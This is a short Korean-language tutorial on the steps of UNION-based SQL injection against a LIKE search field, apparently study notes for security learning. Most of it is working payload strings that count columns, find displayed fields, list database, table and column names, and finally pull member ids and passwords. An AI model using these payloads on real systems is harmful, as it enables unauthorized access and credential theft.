# UNION SQL Injection Process

### **UNION SQL Injection Process**

1. **SQL Injection 포인트 찾기**
2. **COLUMN 개수 찾기**
3. **출력되는 column 위치 찾기**
4. **DB 이름 확인**
5. **Table 이름 확인**
6. **Column 이름 확인**
7. **Data 추출**

&#x20;

항시 위 순서에 맞게 인젝션을 진행하는 게 좋다.

&#x20;

&#x20;

&#x20;

#### 1. SQL Injection 포인트 찾기

: SQL Injection이 되는지 안 되는지 체크하기

&#x20;

1\) like 구문인지 먼저 확인

예시) overwatch 를 검색할 때, full name을 써야한다면 like 아님. over처럼 <mark style="background-color:orange;">**일부만 써도 검색 된다면 like**</mark> 임.

&#x20;

like인 경우 구문은 다음과 같다.

select \* from game where name <mark style="background-color:orange;">**like 'over%'**</mark>

&#x20;

따라서 like 구문인 곳에서는 다음과 같이 SQL Injection 포인트를 찾는다.

1\. 맞는 조건으로 구문 넣어보기

<mark style="background-color:orange;">**over%' and '1%' = '1**</mark>

2\. 틀린 조건으로 구문 넣어보기

<mark style="background-color:orange;">**overrrrr%' and '1%' = '1**</mark>

&#x20;

맞는 조건에선 이상 없고, 틀린 조건에서 결과가 없다고 나오면 SQL Injection이 가능하다고 보면 된다.

&#x20;

&#x20;

#### 2. COLUMN 개수 찾기

union 좌우 select의 컬럼 갯수를 맞춰줘야 하기 때문에

해당 테이블의 컬럼 갯수를 다음과 같이 확인한다.\
(order by 1의 의미 : 1번째 열을 기준으로 정렬해줘!)

&#x20;

<mark style="background-color:orange;">over%'</mark> <mark style="color:red;background-color:orange;">**order by**</mark> <mark style="background-color:orange;">1#</mark>

<mark style="background-color:orange;">over%' order by 2#</mark>

...

&#x20;

오류가 나지 않을 때까지 갯수를 확인한다.

&#x20;

&#x20;

#### 3. 출력되는 column 위치 찾기&#x20;

화면에 출력되는 컬럼이 몇 번째인지 확인한다.

&#x20;

예시) 컬럼이 4개일 때

<mark style="background-color:orange;">over%' union select 1,2,3,4 #</mark>

&#x20;

만약 1, 2, 3, 4가 모두 뜬다면 모든 컬럼을 사용할 수 있는 것.

2만 뜬다면 그 컬럼만 사용할 수 있는 것이다.

&#x20;

&#x20;

#### 4. DB 이름 확인&#x20;

DB의 이름은 다음과 같이 확인할 수 있다.

&#x20;

예시) 두 번째 컬럼만 활용 가능할 때

<mark style="background-color:orange;">over%' union select 1,</mark><mark style="color:red;background-color:orange;">**database()**</mark><mark style="background-color:orange;">,3,4 #</mark>

&#x20;

&#x20;

#### 5. Table 이름 확인&#x20;

테이블 이름은 다음과 같이 확인할 수 있다.

&#x20;

예시) db이름은 위에서 확인한 db 이름을 사용하면 된다.

<mark style="background-color:orange;">over%' union select 1,</mark><mark style="color:red;background-color:orange;">**table\_name**</mark><mark style="background-color:orange;">,3,4 from information\_schema.tables where table\_schema = "</mark><mark style="color:red;background-color:orange;">**DB이름**</mark><mark style="background-color:orange;">" #</mark>

&#x20;

&#x20;

#### 6. Column 이름 확인&#x20;

해당 테이블에 어떤 컬럼들이 있는지 확인한다.

&#x20;

<mark style="background-color:orange;">over%' union select 1,</mark><mark style="color:red;background-color:orange;">**column\_name**</mark><mark style="background-color:orange;">,3,4 from information\_schema.columns where table\_name = '</mark><mark style="color:red;background-color:orange;">**Table이름**</mark><mark style="background-color:orange;">'#</mark>

&#x20;

&#x20;

#### 7. Data 추출&#x20;

지금까지 얻은 정보를 바탕으로 다음과 같이 데이터를 추출한다.

&#x20;

예시) 두 번째 컬럼만 활용 가능할 때

<mark style="background-color:orange;">over%' union select 1,id,3,4 from member #</mark>

<mark style="background-color:orange;">over%' union select 1,pass,3,4 from member #</mark>
